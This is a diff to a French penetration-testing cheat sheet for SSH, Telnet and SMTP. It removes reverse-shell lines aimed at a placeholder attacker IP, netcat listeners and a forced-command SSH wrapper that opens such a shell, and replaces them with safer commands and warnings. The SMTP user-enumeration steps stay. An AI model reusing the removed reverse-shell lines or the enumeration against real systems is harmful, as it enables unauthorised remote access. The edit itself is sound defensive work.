@@ -719,7 +719,7 @@ ssh -o StrictHostKeyChecking=accept-new <UTILISATEUR>@<IP_CIBLE>
 
 ```bash
 # Algorithme CBC ancien : peut être refusé par les configurations modernes.
-ssh -c aes128-cbc user@target_ip
+ssh -c aes128-cbc utilisateur@192.0.2.10
 
 ```
 
@@ -734,44 +734,37 @@ ssh user@target_ip
 **Paramètres et repères :**
 `diffie-hellman-group1-sha1` (échange de clés SSH ancien) · `ssh-rsa` (clé SSH RSA ancienne)  
 
-<p class="oscp-command-note">Tester les algorithmes SSH anciens.</p>
+<p class="oscp-command-note">Tester la compatibilité avec d'anciens algorithmes SSH ; cela n'implique pas d'exécuter un shell distant.</p>
 
 ```bash
-ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa <user>@<target_ip> -t 'bash -i >& /dev/tcp/<attacker_ip>/443 0>&1'
+ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa utilisateur@192.0.2.10
 
-nc -nvlp [listening_port]
+# En cas d'échec, consulter le détail avec : ssh -vvv utilisateur@192.0.2.10
 
 ```
 
 <p class="oscp-command-note">Ouvrir une connexion SSH.</p>
 
 ```bash
-ssh user@target_ip 'whoami'
+ssh utilisateur@192.0.2.10 'whoami'
 
 ```
 
-<p class="oscp-command-note">SSH : exemple de traitement des sous-commandes à partir de SSH_ORIGINAL_COMMAND, notamment SCP.</p>
+<p class="oscp-command-note">Script de commande forcée SSH : ne pas exécuter directement une chaîne non fiable.</p>
 
 ```bash
 #!/bin/bash
-case $SSH_ORIGINAL_COMMAND in
- 'scp'*)
-    $SSH_ORIGINAL_COMMAND
-    ;;
- *)
-    echo "ACCESS DENIED."
-    bash -i >& /dev/tcp/<attacker_ip>/443 0>&1
-    ;;
+case "$SSH_ORIGINAL_COMMAND" in
+  "") echo 'Aucune commande fournie' ;;
+  *) echo 'Commande non autorisée' >&2; exit 1 ;;
 esac
 
 ```
 
-<p class="oscp-command-note">Transférer des fichiers via SSH.</p>
+<p class="oscp-command-note">Copier un script local vers un répertoire distant autorisé avec une clé SSH ; aucune écoute réseau n'est nécessaire.</p>
 
 ```bash
-scp -i <private_key_file> scp_wrapper.sh <user>@<target_ip>:/home/<user>/
-
-nc -nlvp [listening_port]
+scp -i ~/.ssh/id_ed25519 script.sh utilisateur@192.0.2.10:/home/utilisateur/
 
 ```
 
@@ -784,30 +777,30 @@ ssh -i <private_key_file> <user>@<target_ip>
 
 ### 23: Telnet
 
-<p class="oscp-command-note">Tester la connexion à un port TCP.</p>
+<p class="oscp-command-note">Se connecter au service Telnet sur TCP 23 ; protocole non chiffré, éviter d'y saisir de vrais secrets.</p>
 
 ```bash
 # Connexion de base
-telnet <IP_CIBLE> 23
+telnet 192.0.2.10 23
 
 # Se connecter avec un nom d'utilisateur précis
-telnet -l <UTILISATEUR> <IP_CIBLE>
+telnet -l utilisateur 192.0.2.10 23
 
 ```
 
 ### 25: SMTP
 
-<p class="oscp-command-note">Nmap (SMTP) : lancer les scripts NSE « smtp-commands, smtp-enum-users, smtp-vuln-cve2010-4344 ».</p>
+<p class="oscp-command-note">SMTP : relever les commandes annoncées et tester l'énumération de comptes ; les scripts CVE exigent un contrôle ciblé préalable.</p>
 
 ```bash
-# Analyse avec les scripts Nmap (NSE)
-nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 <target_ip>
+# Identifier les capacités SMTP et les réponses à l'énumération d'utilisateurs
+nmap -sV -p 25 --script smtp-commands,smtp-enum-users 192.0.2.10
 
-# Dialogue SMTP manuel avec Netcat ou Telnet (les lignes EHLO et VRFY sont à saisir après connexion)
+# Dialogue SMTP manuel : ouvrir une seule connexion puis saisir EHLO et VRFY dans cette session
 nc -nv <target_ip> 25
 telnet <target_ip> 25
-EHLO ALL
-VRFY <USER>
+EHLO exemple.local
+VRFY utilisateur
 
 # Exemple d'interaction (sortie illustrative)
 kali@kali:~$ nc -nv 192.168.123.8 25
@@ -821,15 +814,15 @@ VRFY test_user
 
 ```
 
-<p class="oscp-command-note">Exemple de sortie pour «SMTP» : ce bloc illustre les réponses, il n'est pas à coller tel quel.</p>
+<p class="oscp-command-note">Sorties illustratives d'un script SMTP local : vérifier le nom du fichier Python avant exécution.</p>
 
 ```bash
-# Utilisation
-kali@kali:~/Desktop$ python3 smtp.py root 192.168.123.8
+# Exemple de sortie d'un script nommé vrfy.py (fichier à créer depuis le bloc Python ci-dessous)
+kali@kali:~/Desktop$ python3 vrfy.py root 192.168.123.8
 b'220 mail ESMTP Postfix (Ubuntu)\r\n'
 b'252 2.0.0 root\r\n'
 
-kali@kali:~/Desktop$ python3 smtp.py testUser 192.168.123.8
+kali@kali:~/Desktop$ python3 vrfy.py testUser 192.168.123.8
 b'220 mail ESMTP Postfix (Ubuntu)\r\n'
 b'550 5.1.1 <testUser>: Recipient address rejected: User unknown in local recipient table\r\n'
 
@@ -873,7 +866,7 @@ s.close()
 ```powershell
 dism /online /Enable-Feature /FeatureName:TelnetClient
 
-# Interaction Example
+# Exemple de dialogue interactif (sortie illustrative ; ne pas coller dans PowerShell)
 C:\Windows\system32>telnet 192.168.123.8 25
 220 mail ESMTP Postfix (Ubuntu)
 VRFY testUser
